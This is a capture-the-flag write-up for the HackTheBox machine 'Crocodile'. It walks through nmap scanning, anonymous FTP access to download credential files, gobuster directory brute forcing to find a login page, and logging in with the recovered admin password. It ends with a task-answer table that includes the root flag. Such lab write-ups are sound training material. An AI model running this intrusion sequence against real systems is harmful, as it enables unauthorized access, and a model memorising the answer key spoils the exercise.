TITLE: Crocodile
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Crocodile.png
---

# Crocodile

Crocodile is an HTB machine that involves anonymous FTP access to steal credentials followed by web directory brute forcing to find a login portal.

## Recon

Nmap reveals ports 21 (FTP) and 80 (HTTP) are open.

```bash
nmap -sV -sC 10.129.171.104
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 21 | FTP | vsftpd 3.0.3 |
| 80 | HTTP | Apache httpd 2.4.41 |

### FTP Enumeration

FTP allows anonymous login. We connect and find two interesting files: `allowed.userlist` and `allowed.userlist.passwd`.

```bash
ftp 10.129.171.104
Name: anonymous
ftp> ls
-rw-r--r--    1 0        0              33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 0        0              62 Jun 08  2021 allowed.userlist.passwd
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

## Exploitation

### Web Enumeration

We use `gobuster` to find hidden directories and files on the web server.

```bash
gobuster dir -u http://10.129.171.104 -w /usr/share/wordlists/dirb/common.txt -x php,html
```

Gobuster identifies `/login.php`.

### Web Login

We use the credentials found on the FTP server to attempt a login.
- **Username**: `admin`
- **Password**: `vPrSlogAL_4u7tAt`

After logging in, the root flag is displayed on the dashboard.

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | Which nmap switch can we use to enumerate machines when our packets are otherwise blocked? | `-Pn` |
| 2 | What is the name of the nmap script that provides a list of common configuration files that may be found on a target web server? | `http-enum` |
| 3 | What is the response code we get for the FTP message 'Login successful'? | `230` |
| 4 | There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. | `ls` |
| 5 | What is the acronym for the protocol we can use to download files from the FTP server to our local machine? | `FTP` |
| 6 | What username can we use to log into the FTP server without having an account? | `anonymous` |
| 7 | What version of Apache HTTP Server is running on the target host? | `Apache httpd 2.4.41` |
| 8 | What switch can we use with Gobuster to specify we are looking for specific filetypes? | `-x` |
| 9 | Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? | `login.php` |
| 10 | Submit root flag | `c7110277ac44d78b6a9fff2232434d16` |
